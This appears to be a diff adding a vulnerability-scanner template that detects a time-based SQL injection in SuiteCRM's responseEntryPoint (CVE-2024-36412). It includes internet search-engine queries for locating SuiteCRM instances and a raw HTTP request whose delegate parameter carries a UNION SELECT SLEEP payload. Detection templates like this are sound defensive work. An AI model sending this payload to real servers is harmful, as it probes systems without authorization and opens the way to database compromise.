@@ -1,0 +1,30 @@
+id: SuiteCRM_responseEntryPoint_SQLi
+
+info:
+  name: SuiteCRM_responseEntryPoint_SQLi
+  author: HK
+  severity: high
+  description: SuiteCRM系统接口responseEntryPoint存在SQL注入漏洞(CVE-2024-36412)
+  metadata:
+    max-request: 1
+    Fofa-query: title="SuiteCRM"
+    Quake-query: title="SuiteCRM"
+    Hunter-query: title="SuiteCRM"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(4);--+-&type=c&response=accept HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Accept-Encoding: gzip
+    Connection: close
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
